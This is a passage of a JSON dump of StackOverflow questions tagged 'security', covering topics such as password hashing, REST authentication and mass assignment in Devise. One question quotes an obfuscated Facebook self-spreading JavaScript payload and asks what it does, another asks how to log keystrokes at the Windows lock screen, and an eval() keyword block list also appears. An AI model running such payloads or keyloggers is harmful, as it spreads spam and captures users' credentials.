so how to protect from date-time changes?</p>\n\n<p>Storing app startup and close times in encrypted file won't work as date can be changed (with program uptime of 8 hours per day, would be possible to extend license to almost 300% in ideal case - change time to app close time + 1 second before launching program).</p>\n\n<p>Another question - is there any way to protect from software like <a href=\"http://en.wikipedia.org/wiki/Deep_Freeze_(software\">http://en.wikipedia.org/wiki/Deep_Freeze_(software</a>)? (maybe scan drivers?)</p>\n\n<p><strong>EDIT:</strong><br>\nI'm currently using smart card to store licensing information and will use code virtualizer on critical functions (I know about making breakpoints on API calls and inspecting passed data - don't need to hide that data, just to ensure things go as planned)</p>\n"},{"tags":["web-services","security","rest","oauth","restful-authentication"],"answer_count":2,"favorite_count":15,"up_vote_count":12,"down_vote_count":0,"view_count":7371,"score":12,"question_id":4817643,"title":"How to secure RESTful web services?","body":"<p>I have to implement secure <a href=\"https://www.ibm.com/developerworks/webservices/library/ws-restful/\" rel=\"nofollow\">RESTful web services</a>. I already did some research using Google but I'm stuck.</p>\n\n<p>Options:</p>\n\n<p>TLS (HTTPS) +</p>\n\n<ul>\n<li>HTTP Basic (pc1oad1etter)</li>\n<li>HTTP Digest </li>\n<li><a href=\"http://stackoverflow.com/questions/4239846/2-legged-oauth-and-rest\">two-legged</a> OAuth</li>\n<li><a href=\"http://stackoverflow.com/questions/319530/restful-authentication\">a Cookie-based approach</a></li>\n<li>client certificates (Tom Ritter and <a href=\"http://stackoverflow.com/questions/1522368/solutions-to-web-service-client-certificates-auth-best-practices\">here</a>)</li>\n<li>Signed requests using <a href=\"http://en.wikipedia.org/wiki/HMAC\" rel=\"nofollow\">HMAC</a> and <a href=\"http://s3.amazonaws.com/doc/s3-developer-guide/RESTAuthentication.html\" rel=\"nofollow\">a limited lifetime</a></li>\n</ul>\n\n<p>Are there more possible options to consider? If OAuth then what version? Does it even matter? From what I've read so far <a href=\"http://tools.ietf.org/pdf/draft-ietf-oauth-v2-12.pdf\" rel=\"nofollow\">OAuth 2.0</a> with bearer tokens (that is without signatures) seems to be <a href=\"http://hueniverse.com/2010/09/oauth-bearer-tokens-are-a-terrible-idea/\" rel=\"nofollow\">insecure</a>.</p>\n\n<p>I've found another very interesting article on <a href=\"http://www.berenddeboer.net/rest/authentication.html\" rel=\"nofollow\">REST based authentication</a>.</p>\n"},{"tags":["security","authentication","iis","ssl","certificate"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":65,"score":0,"question_id":12701295,"title":"require client certificates in IIS without requiring SSL","body":"<p>In IIS 7, I've created an https binding for a site, and I'd like to require client certificates for https and still keep my http endpoint. </p>\n\n<p>That is to say, I'd like to require client certificates for my https endpoint without requiring SSL across the board and disallowing access to my http endpoint (via \"require SSL\" in SSL Settings). Is this possible?</p>\n"},{"tags":["php","security","passwords","protect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12700974,"title":"How to password protect an uploaded pdf in PHP","body":"<p>I have a web app where users can upload pdf documents. Is there a php library that I can use to password protect the pdf file? I need the library to preserve all aspects of the original pdf (i.e. size, fonts, resolution, etc).</p>\n"},{"tags":["security","encryption","hash","salt"],"answer_count":4,"favorite_count":16,"up_vote_count":21,"down_vote_count":0,"view_count":8104,"score":21,"question_id":1191112,"title":"Password hashing, salt and storage of hashed values","body":"<p>Suppose you were at liberty to decide how hashed passwords were to be stored in a DBMS.  Are there obvious weaknesses in a scheme like this one?</p>\n\n<p>To create the hash value stored in the DBMS, take:</p>\n\n<ul>\n<li>A value that is unique to the DBMS server instance as part of the salt,</li>\n<li>And the username as a second part of the salt,</li>\n<li>And create the concatenation of the salt with the actual password,</li>\n<li>And hash the whole string using the SHA-256 algorithm,</li>\n<li>And store the result in the DBMS.</li>\n</ul>\n\n<p>This would mean that anyone wanting to come up with a collision should have to do the work separately for each user name and each DBMS server instance separately.  I'd plan to keep the actual hash mechanism somewhat flexible to allow for the use of the new <a href=\"http://www.schneier.com/blog/archives/2009/07/sha-3_second_ro.html\">NIST</a> standard hash algorithm (<a href=\"http://csrc.nist.gov/groups/ST/hash/sha-3/index.html\">SHA-3</a>) that is still being worked on.</p>\n\n<p>The 'value that is unique to the DBMS server instance' need not be secret - though it wouldn't be divulged casually.  The intention is to ensure that if someone uses the same password in different DBMS server instances, the recorded hashes would be different. Likewise, the user name would not be secret - just the password proper.</p>\n\n<p>Would there be any advantage to having the password first and the user name and 'unique value' second, or any other permutation of the three sources of data?  Or what about interleaving the strings?</p>\n\n<p>Do I need to add (and record) a random salt value (per password) as well as the information above?  (Advantage: the user can re-use a password and still, probably, get a different hash recorded in the database.  Disadvantage: the salt has to be recorded.  I suspect the advantage considerably outweighs the disadvantage.)</p>\n\n<p>There are quite a lot of related SO questions - this list is unlikely to be comprehensive:</p>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/287517/encrypting-hashing-plain-text-passwords-in-database\">Encrypting/Hashing plain text passwords in database</a></li>\n<li><a href=\"http://stackoverflow.com/questions/401656/secure-hash-and-salt-for-php-passwords\">Secure hash and salt for PHP passwords</a></li>\n<li><a href=\"http://stackoverflow.com/questions/213380/the-necessity-of-hiding-the-salt-for-a-hash\">The necessity of hiding the salt for a hash</a></li>\n<li><a href=\"http://stackoverflow.com/questions/348704/client-side-md5-hash-with-time-salt\">Clients-side MD5 hash with time salt</a></li>\n<li><a href=\"http://stackoverflow.com/questions/30946/simple-password-encryption\">Simple password encryption</a></li>\n<li><a href=\"http://stackoverflow.com/questions/1645161/salt-generation-and-open-source-software\">Salt generation and Open Source software</a></li>\n<li><a href=\"http://dba.stackexchange.com/questions/7492/password-hashes-fixed-length-binary-fields-or-single-string-field\">Password hashes: fixed-length binary fields or single string field?</a></li>\n</ul>\n\n<p>I think that the answers to these questions support my algorithm (though if you simply use a random salt, then the 'unique value per server' and username components are less important).</p>\n"},{"tags":["javascript","security","eval","injection","jsfiddle"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12699359,"title":"Which keywords should I filter in eval()?","body":"<p>I need to use eval() for a JavaScript-based web app I'm building. </p>\n\n<p>The reason for this is that I want to let people write their own functions that get stored as text, and can be re-used on the site when then need to use them another time. Think along the lines of jsFiddle.</p>\n\n<p>The code will either be run and eval'ed, or will inserted as a script tag. Either way, it leaves the site open to JavaScript injection by malicious users. As such, I'm planning to either filter submitted code, or when a user loads another user's script, have a warning message that the user should first read / check the script before continuing.</p>\n\n<p>So far, I'm looking to filter / warn on the following keywords:</p>\n\n<pre><code>eval\nexecScript\n\nscript\n\nwindow.*\nsetInterval\nsetTimeout\nalert\nconfirm\nprompt\n\ndocument.*\nwrite\ninnerHTML\ninsertAdjacentHTML\ncreateElement\nappendChild\nsetAttribute\n\nform.*\nsubmit\n\nXMLHttpRequest\n\njQuery.*\najax\n\nbase64encode\nbase64decode\n</code></pre>\n\n<p>I've not started testing yet, so these are only my initial thoughts.</p>\n\n<p>Anyone got experience or opinion on this?</p>\n\n<p>Thanks,\nDave</p>\n"},{"tags":["php","security","suhosin"],"answer_count":3,"favorite_count":3,"up_vote_count":11,"down_vote_count":1,"view_count":1517,"score":10,"question_id":568609,"title":"Why isn't Suhosin part of the PHP core?","body":"<p>It seems Suhosin patches and extends the PHP core as a means to protect users from flaws in the core. It also seems some smart people are using this system. Since it appears to be a good thing, I'm curious as to why its not part of the PHP core to begin with. Anybody know?</p>\n\n<p><strong>Update:</strong> Apparently some distributions of Linux also package PHP with Suhosin by default. This seems to be true for Debian (Lenny at least) and Arch Linux. Any other distributions package PHP with Suhosin by default?</p>\n"},{"tags":["ios","ipad","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12661227,"title":"Check for device lock and validate certificate","body":"<p>For one of my iOS apps I need to check two things:</p>\n\n<ul>\n<li>Is there an active device lock (pass code)</li>\n<li>Has the device lock been triggered by the correct authority / certificate (e.g. my own certificate). This is required to assure specific security guidelines.</li>\n</ul>\n\n<p>For the first part of my question I found <a href=\"http://stackoverflow.com/a/6195643\">this</a> answer - which is sufficient for me. How would you accomplish the second part?</p>\n"},{"tags":["php","security","file","escaping"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12690763,"title":"Escape a valid filename/path","body":"<p>So i'm getting into security problems right now, and i want to know what is the perfect approach in making scripts safe. I have somewhere in my code this</p>\n\n<pre><code>$AdditionalPath = preg_replace(\"/^[A-Za-z0-9._-\\/\\\\]/\",\"\",$AdditionalPath);\nrequire $AdditionalPath.\"../xdata/php/website_config/mysql.php\";\n</code></pre>\n\n<p><code>$AdditionalPath</code> may be everything, even a malicious code, so i tough to myself that i should let certain characters into that variable, like <code>A-Z</code> <code>a-z</code> <code>0-9</code> <code>.</code> <code>/</code> <code>\\</code> . I'm i correct? And also did i made this regex correctly?</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","windows-desktop-gadgets","gadget"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":301,"score":1,"question_id":11490844,"title":"What's the \"gadget vulnerability\"?","body":"<p>In a recent security advisory, Microsoft warns that \"<em>Vulnerabilities in Gadgets Could Allow Remote Code Execution</em>\":</p>\n\n<blockquote>\n  <p>An attacker who successfully exploited a Gadget vulnerability could run arbitrary code in the context of the current user.</p>\n</blockquote>\n\n<p>(<a href=\"http://technet.microsoft.com/en-us/security/advisory/2719662\" rel=\"nofollow\">Microsoft Security Advisory 2719662</a>)</p>\n\n<hr>\n\n<p>I don't really understand the point. As far as I know, gadgets are (by design) HTML-based application running with full trust!</p>\n\n<blockquote>\n  <p><strong>Full Trust</strong></p>\n  \n  <p>The choice to run a gadget is presented to the user in the same way that the choice to run any application downloaded from the Internet is presented. Information about the author of the gadget is displayed in a dialog box that indicates there is risk associated with this file. After the user accepts the warning, the gadget will run with all of the permissions associated with the user's login account.</p>\n</blockquote>\n\n<p>(<a href=\"http://msdn.microsoft.com/en-us/library/windows/desktop/ff486358.aspx#_sidebar_overview_fulltrust\" rel=\"nofollow\">MSDN: Gadgets for Windows Sidebar Security</a>)</p>\n\n<p>For example, nothing prevents you from adding</p>\n\n<pre><code>&lt;script language=\"VBScript\"&gt; \n    Set shell = CreateObject(\"Wscript.Shell\")\n    shell.Run \"notepad.exe\"\n&lt;/script&gt; \n</code></pre>\n\n<p>and executing arbitrary commands from your gadget. <a href=\"http://blogs.technet.com/b/heyscriptingguy/archive/2005/10/31/how-can-i-start-an-application-from-an-hta.aspx\" rel=\"nofollow\">This works and it's by design.</a></p>\n\n<p>Obviously, they can do everything that another application running in the local user's context can do. So, where is the <em>vulnerability</em> the MS Security Advisory is mentioning which \"can be exploited\"?</p>\n"},{"tags":["java","security","policy","javapolicy"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":12696365,"title":"Loading Desired Policy Implementation in JVM (Loading the value of policy.provider in Java security properties file)","body":"<p>According to the <a href=\"http://docs.oracle.com/javase/6/docs/api/java/security/Policy.html\" rel=\"nofollow\">documentation</a>, the default Policy implementation can be changed by setting the value of the \"policy.provider\" security property (in the Java security properties file) to the fully qualified name of the desired Policy subclass implementation.</p>\n\n<p>I created my own implementation of the policy provider class and did the changes accordingly to the Java security properties file. But the class didn't get loaded . After bit researching I came across this <a href=\"http://www.tedneward.com/files/Papers/JavaPolicy/JavaPolicy.pdf\" rel=\"nofollow\">whitepaper</a>,which says simply \"create a \"classes\" directory under the \"jre\" directory and place the Policy implementation there. Now the bootstrap ClassLoader will pick up the MyPolicy implementation\". Though I tried that still it ws a failure.</p>\n\n<p>How can I make my policy implementation available to the bootstrap ClassLoader for the successful loading?</p>\n"},{"tags":["java","windows","security","login","keyboard-input"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12674056,"title":"Trap keyboard input from windows logon screen ","body":"<p>I want to do following things to be done my Java project:-</p>\n\n<ol>\n<li>Lock Windows desktop.</li>\n<li>Detect key press event when windows desktop is locked.</li>\n<li>Save entered keys from keyboard in a text file.</li>\n</ol>\n\n<p>First step is done using this code: </p>\n\n<pre><code>Runtime rt = Runtime.getRuntime();\nProcess pr = rt.exec(\"C:\\\\Windows\\\\System32\\\\rundll32.exe user32.dll,LockWorkStation\");\n</code></pre>\n\n<p>Please someone help me out from this problem...</p>\n"},{"tags":["ruby-on-rails","security","devise"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12356327,"title":"Security - Filter attributes when creating user with Devise","body":"<p>My concern is about the possibility for a malicious user to add an extra parameter when he registers on my site. I'm using Rails 3.2.8 and Devise 2.1.2. I have a class <code>User</code> with an <code>admin</code> attribute</p>\n\n<p><em>user.rb</em> </p>\n\n<pre><code>class User &lt; ActiveRecord::Base\n  devise :database_authenticatable, :registerable, :recoverable, :trackable,\n     :validatable, :token_authenticatable, :lockable\nend\n</code></pre>\n\n<p><em>schema.rb</em></p>\n\n<pre><code>create_table \"users\", :force =&gt; true do |t|\n  t.boolean  \"admin\"\n  t.string   \"email\",                                  :null =&gt; false\n  t.string   \"encrypted_password\",     :default =&gt; \"\", :null =&gt; false\n  # other devise columns are not relevant for the question...\nend\n</code></pre>\n\n<p>I'm using the provided <code>Devise::RegistrationsController</code> for the registration of a User, and a custom view with <code>email</code> and <code>password</code>:</p>\n\n<pre><code>&lt;%= form_for(resource, :as =&gt; resource_name, :url =&gt; registration_path(resource_name)) do |f| %&gt;\n  &lt;%= devise_error_messages! %&gt;\n\n  &lt;div class=\"form_line\"&gt;\n    &lt;%= f.label :email, 'Email' %&gt;\n    &lt;%= f.email_field :email %&gt;\n  &lt;/div&gt;\n  &lt;div class=\"form_line\"&gt;\n    &lt;%= f.label :password, 'Password' %&gt;\n    &lt;%= f.password_field :password %&gt;\n  &lt;/div&gt;\n  &lt;div class=\"form_line\"&gt;\n    &lt;%= f.label :password_confirmation, 'Password confirmation' %&gt;\n    &lt;%= f.password_field :password_confirmation %&gt;\n  &lt;/div&gt;\n\n  &lt;div class=\"actions\"&gt;\n    &lt;%= f.submit \"Register\", class: 'button' %&gt;\n  &lt;/div&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>I works perfectly, but a if a malicious user adds a parameter <code>admin</code> with value <code>true</code> in the post request, the user is created with the admin privileges. </p>\n\n<pre><code>Started POST \"/users\" for 127.0.0.1 at 2012-09-10 18:46:15 +0200\nProcessing by RegistrationsController#create as HTML\n  Parameters: { \"user\"=&gt;{\"email\"=&gt;\"test@example.com\", \"password\"=&gt;\"[FILTERED]\", \"password_confirmation\"=&gt;\"[FILTERED]\", \"admin\"=&gt;\"true\" }\n</code></pre>\n\n<p>That's a security weakness in my site. Can I configure Devise to ignore extra parameters (I need only email and password) when a user registers (or updates its profile, I think I'll have the same problem) ? If it's not possible, is there another solution ?</p>\n"},{"tags":["linux","security","centos"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":29,"score":0,"question_id":12695008,"title":"How can I check the history of my centos VPS? Linux","body":"<p>I'm about to hand out my root server password to a company for them to fix an issue that I have with mydns.</p>\n\n<p>I'm sure they are all above board (and I will change the root password after they have finished) but I just want to be sure.</p>\n\n<p>I know (well I think) I can login after them and execute <code>history</code> to see what they did, but I know if they are dishonest, they can just clear the history. I'm worried in case a rogue employee does something malicious or installs keylogging software (which has happened when my mate let another company manage his VPS).</p>\n\n<p>So is there anything I can do? Does the history command backup somewhere? Can I install a keylogger to verify the commands they execute are not malicious?</p>\n\n<p>Any ideas welcome. Ideally I appreciate I shouldn't give out my root password if I don't trust them. But I am in a very difficult situation and have no choice. </p>\n"},{"tags":["android","security","piracy"],"answer_count":2,"favorite_count":3,"up_vote_count":10,"down_vote_count":0,"view_count":375,"score":10,"question_id":9498015,"title":"How should I code to resist \"one-click piracy\"?","body":"<p>The app I am working on is automatically cracked by antiLVL (although I am not using the LVL in my app).</p>\n\n<p>In order of protecting my app from \"one-click piracy\", I am implementing <a href=\"http://www.google.com/events/io/2011/sessions/evading-pirates-and-stopping-vampires-using-license-verification-library-in-app-billing-and-app-engine.html\">tampering detection techniques explained at Google IO</a>.</p>\n\n<p>I have tried checking the signature both with <code>getPackageInfo()</code> and reflection (<code>invoke()</code>), but AntiLVL was able to crack the app automatically in both cases.</p>\n\n<p>How can I write code that will not be automatically cracked by the current version of antiLVL (1.4.0)? I mean, apart from using JNI.</p>\n\n<p>PS: I am not talking about preventing piracy in general. I just want the pirate to dig into the code by hand rather than using an automatic cracker.</p>\n"},{"tags":["javascript","security","internet-explorer-9"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":523,"score":1,"question_id":8317725,"title":"IE9 \"Can't execute code from freed script\" when calling hasOwnProperty()","body":"<p>Here is the scenario:</p>\n\n<p>I have a container page that swaps iFrames in and out to show different content. All iFrames come from the same domain. https is enabled.</p>\n\n<ul>\n<li>The container page has an object called Flow, with functions set/getParameter</li>\n<li>The first iFrame, s0-welcome, creates an object, data, and calls Flow.setParameter('data', data);</li>\n<li>The container then replaces the first iFrame with a second iFrame, s1-transfer. </li>\n<li>The s1-transfer calls Flow.getParameter('data') and stores it in a local variable s1data</li>\n</ul>\n\n<p>In the IE9 debug tools console, if I type s1data it shows me all the properties of that object. However, if I call s1data.hasOwnProperty('prop1'), I get a \"Can't execute code from a freed script\" error. If I call Object.prototype.hasOwnProperty.call(s1data, \"prop1\"), everything works fine.</p>\n\n<p>It looks to me that there can be 2 possibilities:</p>\n\n<p>1) Container page holds on to the reference from the first iFrame, but when the first iFrame gets disposed, it loses some of the data. This seems unlikely since the only thing I can't access is functions</p>\n\n<p>2) There is a security restriction that does not allow one iFrame to run code related to another iFrame even if both iFrames are from the same domain.</p>\n\n<p>Any thoughts?</p>\n"},{"tags":["javascript","security"],"answer_count":3,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":3216,"score":6,"question_id":2634159,"title":"Javascript in the address bar - is this malicious? ","body":"<p>I got a message on Facebook telling me to copy and paste this into my address bar. I thought I'd post it here and see what everyone thinks about it. What does it do? How does it work? </p>\n\n<p>Here's the source code: </p>\n\n<pre><code>// (DO NOT DO THIS!)\nJavascript:var a=[\"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x54\\x4D\\x4C\",\"\\x61\\x70\\x70\\x34\\x39\\x34\\x39\\x37\\x35\\x32\\x38\\x37\\x38\\x5F\\x61\\x70\\x70\\x34\\x39\\x34\\x39\\x37\\x35\\x32\\x38\\x37\\x38\\x5F\\x64\\x64\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x3C\\x61\\x20\\x69\\x64\\x3D\\x22\\x73\\x75\\x67\\x67\\x65\\x73\\x74\\x22\\x20\\x68\\x72\\x65\\x66\\x3D\\x22\\x23\\x22\\x20\\x61\\x6A\\x61\\x78\\x69\\x66\\x79\\x3D\\x22\\x2F\\x61\\x6A\\x61\\x78\\x2F\\x73\\x6F\\x63\\x69\\x61\\x6C\\x5F\\x67\\x72\\x61\\x70\\x68\\x2F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2E\\x70\\x68\\x70\\x3F\\x63\\x6C\\x61\\x73\\x73\\x3D\\x46\\x61\\x6E\\x4D\\x61\\x6E\\x61\\x67\\x65\\x72\\x26\\x61\\x6D\\x70\\x3B\\x6E\\x6F\\x64\\x65\\x5F\\x69\\x64\\x3D\\x31\\x31\\x32\\x36\\x38\\x32\\x36\\x39\\x35\\x34\\x31\\x38\\x35\\x32\\x33\\x22\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x20\\x70\\x72\\x6F\\x66\\x69\\x6C\\x65\\x5F\\x61\\x63\\x74\\x69\\x6F\\x6E\\x20\\x61\\x63\\x74\\x69\\x6F\\x6E\\x73\\x70\\x72\\x6F\\x5F\\x61\\x22\\x20\\x72\\x65\\x6C\\x3D\\x22\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2D\\x70\\x6F\\x73\\x74\\x22\\x3E\\x53\\x75\\x67\\x67\\x65\\x73\\x74\\x20\\x74\\x6F\\x20\\x46\\x72\\x69\\x65\\x6E\\x64\\x73\\x3C\\x2F\\x61\\x3E\",\"\\x73\\x75\\x67\\x67\\x65\\x73\\x74\",\"\\x4D\\x6F\\x75\\x73\\x65\\x45\\x76\\x65\\x6E\\x74\\x73\",\"\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x76\\x65\\x6E\\x74\",\"\\x63\\x6C\\x69\\x63\\x6B\",\"\\x69\\x6E\\x69\\x74\\x45\\x76\\x65\\x6E\\x74\",\"\\x64\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x45\\x76\\x65\\x6E\\x74\",\"\\x73\\x65\\x6C\\x65\\x63\\x74\\x5F\\x61\\x6C\\x6C\",\"\\x73\\x67\\x6D\\x5F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x66\\x6F\\x72\\x6D\",\"\\x2F\\x61\\x6A\\x61\\x78\\x2F\\x73\\x6F\\x63\\x69\\x61\\x6C\\x5F\\x67\\x72\\x61\\x70\\x68\\x2F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2E\\x70\\x68\\x70\",\"\\x73\\x75\\x62\\x6D\\x69\\x74\\x44\\x69\\x61\\x6C\\x6F\\x67\"];\nvoid (document[a[2]](a[1])[a[0]]=a[3]);var ss=document[a[2]](a[4]);\nvar c=document[a[6]](a[5]);\nc[a[8]](a[7],true,true);\nvoid (ss[a[9]](c));\nvoid (setTimeout(function (){fs[a[10]]();} ,4000));\nvoid (setTimeout(function (){SocialGraphManager[a[13]](a[11],a[12]);} ,5000));\nvoid (setTimeout(function (){\ndocument[a[2]](a[1])[a[0]]=\"\\x3C\\x61\\x20\\x68\\x72\\x65\\x66\\x3D\\x27\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x62\\x69\\x74\\x2E\\x6C\\x79\\x2F\\x62\\x54\\x6C\\x30\\x76\\x6A\\x27\\x3E\\x43\\x6F\\x6D\\x70\\x6C\\x65\\x74\\x65\\x64\\x21\\x20\\x43\\x6C\\x69\\x63\\x6B\\x20\\x68\\x65\\x72\\x65\\x3C\\x2F\\x61\\x3E\";\n} ,5400));\n</code></pre>\n"},{"tags":["security","oauth"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12692869,"title":"Oauth: Does the same consumer key/secret generate the same oauth token and token secret for each account being authorized?","body":"<p>The scenario is basically two different users authorizing the same account using oauth. Are they guranteed to have the same token &amp; token-secret?</p>\n\n<p>It seems like it does with twitter and maybe linkedin. I would like to know if this is by design or just particular to twitter.</p>\n"},{"tags":["facebook","flash","security","actionscript"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12671759,"title":"Flash ActionScript 3 get auth info within single SWF","body":"<p>I am developing flash application as single <code>swf</code> file, without HTML wrapper (but for sure I have this swf located at my hosting). I have create application at developers section. The problem I have faced is: when I post this SWF to the my wall at FaceBook I can not get any call from this SWF of the <code>URLloader</code> or <code>ExternalItreface</code>. </p>\n\n<p>For example, I need to do <a href=\"http://developers.facebook.com/docs/authentication/signed_request/\" rel=\"nofollow\">Signed Request</a> in order to get user information but I have got <em>Security Error</em> which say that my domain cannot get information from apps.facebook.com</p>\n\n<p>The request I am doing is a simple:</p>\n\n<pre><code>var urlRequest:URLRequest = new URLRequest(\"http://apps.facebook.com/my_app_name\");\n</code></pre>\n\n<p>Is there any way to inform faceebok that my hosting is a security save?</p>\n"},{"tags":["facebook","security","database-design"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":387,"score":1,"question_id":9450317,"title":"Facebook photo renaming convention","body":"<p>When we upload any photo to Facebook it is renamed by Facebook. The new name generally has the following pattern: \n393268_10151029983750034_598680033_21778114_899520598_n.jpg</p>\n\n<p>This name can be split with underscore in 6 parts.</p>\n\n<ol>\n<li>I know that the second number in the name is the fbid of the photo and you can access the photo directly in Facebook with: <a href=\"https://www.facebook.com/photo.php?fbid=10151029983750034\" rel=\"nofollow\">https://www.facebook.com/photo.php?fbid=10151029983750034</a> provided you have the necessary permissions.</li>\n<li>The third number is the Facebook profile id of the uploader of the photo. You can go to the profile of the uploader by: <a href=\"https://www.facebook.com/profile.php?id=598680033\" rel=\"nofollow\">https://www.facebook.com/profile.php?id=598680033</a></li>\n</ol>\n\n<p>I have the following questions regarding this naming convention:</p>\n\n<ol>\n<li>Does anyone know what other information is present in the name of the photo? Is the information about the shards/node/bucket to which the photo belongs present in the photo name?</li>\n<li>What are the advantages/disadvantages of such a naming convention?</li>\n</ol>\n"}]}
{"total":17772,"page":11,"pagesize":100,"questions":[{"tags":["django","security","api","tastypie"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12689311,"title":"Security using Tastypie in Mobile Devices Best practices","body":"<p>Which is the best way to use Django / Python Tastypie to build and API for mobile devices?</p>\n\n<p>What I want to do is:</p>\n\n<ul>\n<li>People connection to some api.domain.com/dosomething/</li>\n<li>I would like that people could identify themselves without cookies.</li>\n<li>I want something more or less secure ( I am afraid people could look into the code to find some API_SECRET )</li>\n</ul>\n\n<p>Is tastypie a good option? Any idea?</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","computer-science","discrete-mathematics","ciphers"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":1132,"score":0,"question_id":1722908,"title":"multiplicative inverse?","body":"<p>I know that an affine cipher substitutes BD with SG. I need to find the encryption formula, in the form <code>y = a x + b</code>, where a and b are coefficients.\nFrom the information above I end up having to equations:\n<code>a+b=18</code> and\n<code>3a+b=6</code>\nSo I am working like this:\n<code>a+b=18</code> and <code>3a + b = 6-&gt; 3a+18-a=6-&gt; 2a= 6-18 -&gt; 2a=14 </code>(cuz it is mod 26)</p>\n\n<p><code>b=18-a </code></p>\n\n<p><code>2a=?</code>So, O want to multiply by the multiplicative inverse of 2 mod 26</p>\n\n<p>I can't find a multiplicative inverse of number 2 with 26 (<code>y = ax + b mod 26</code>)</p>\n\n<p>Can anyone please help me find a and b???</p>\n"},{"tags":["security","fingerprint"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":101,"score":5,"question_id":12627765,"title":"Convert Finger Print image to comparable template","body":"<p>I have a finger print scanner which gives me only an image of finger-print(it's SDK doesn't provide any functionality for \"converting\" them into template and for comparing these templates).\nMy question is which approach should I use: look for an SDK which does provide functionality for converting and comparing finger-print images, or shpuld I write these algorithms on my own(which  seems hard and time consuming). If first method is preferred, What are open source/paid sdk's for that work? Can you give me some links</p>\n\n<p>My device is Verifier 300 LC.</p>\n\n<p>Thanx in advance :)</p>\n"},{"tags":["php","security","hash","passwords"],"answer_count":3,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":100,"score":6,"question_id":12459896,"title":"password_compat for older php version","body":"<p>PHP 5.5 will <a href=\"https://wiki.php.net/rfc/password_hash\">support</a> the password functions <code>password_hash()</code> and <code>password_verify()</code>. Also there is a <a href=\"https://github.com/ircmaxell/password_compat\">file</a> to add this functions in >5.3.7.</p>\n\n<p>My problem is that I am currently running the debian package 5.3.3-7+squeeze14.</p>\n\n<p>Is there a way to make this function available with this old PHP version?</p>\n"},{"tags":["wcf","web-services","security","iis"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":125,"score":3,"question_id":10757463,"title":"Internal WCF Service on a public facing server security","body":"<p>I need to host a WCF service that will give its clients access to internal business systems on a public facing web server. Obviously I must secure this so that no one from the outside world even knows the service exists, let alone be able to call methods and access the data it exposes.</p>\n\n<p>The overall idea is that the public facing website hosted on the same machine will call the WCF service and then the WCF service will provide it with the required data...</p>\n\n<p><code>Public Facing Web Site &lt;-&gt; WCF Service &lt;-&gt; Business Systems / Databases</code></p>\n\n<p>So I need to understand how to secure the service so it can only be accessed via the public facing website.</p>\n\n<p>Ideas I had..</p>\n\n<ul>\n<li>IIS filtering so that the IIS Site hosting the WCF service will only accept requests from a certain IP address.</li>\n<li>Obscure port that will not be allowed through the public facing firewall.</li>\n<li>Protocol such as NetTCP or NamedPipes</li>\n</ul>\n\n<p>But what about the actual WCF security set up? As both the Public Facing Site and the service are on the same machine is Windows Authentication as option? Questions I have regarding this are...</p>\n\n<ul>\n<li><p>Should the service client and the service simply use Windows Authentication?</p></li>\n<li><p>Do I need specific user accounts as opposed to Network Service? If the website runs under network service would this then automatically authenticate to the service?</p></li>\n</ul>\n\n<p>My objective is that someone in the outside world should not know of the services existance or be able to make access to it.</p>\n\n<p>Thanks in advance.</p>\n\n<p>Technical environment is: IIS7, .Net 4 and WCF 4.</p>\n"},{"tags":["security","authentication","google","oauth","openid"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12679267,"title":"Handle OAuth signup/login when email exist","body":"<p>Problem assumptions/conditions:</p>\n\n<ol>\n<li>There exists a user with email <code>foo@bar.com</code> (unverified) in the system.</li>\n<li>Visitor is not signed into the system (no current session, e.g. new browser).</li>\n<li>Visitor signup/login using Google Account, through OAuth (user authorizes).</li>\n<li>The system receives callback with uid and the email <code>foo@bar.com</code> [verified by Google].</li>\n</ol>\n\n<p>I see three options here:</p>\n\n<p>A. Sign in the visitor to the existing account with email 